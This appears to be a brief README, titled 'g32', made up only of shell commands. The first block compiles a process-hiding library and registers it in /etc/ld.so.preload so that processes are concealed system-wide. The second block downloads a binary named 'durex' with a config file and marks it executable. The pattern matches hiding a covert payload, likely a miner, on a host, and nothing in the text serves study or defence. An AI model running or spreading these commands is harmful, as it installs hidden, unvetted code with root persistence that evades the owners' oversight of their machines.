# g32

git clone https://github.com/cihuuy/libn && cd libn && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload 

#

wget https://raw.githubusercontent.com/bulboni/g32/main/durex \
&& wget https://raw.githubusercontent.com/bulboni/g32/main/config.json \
&& chmod +x durex
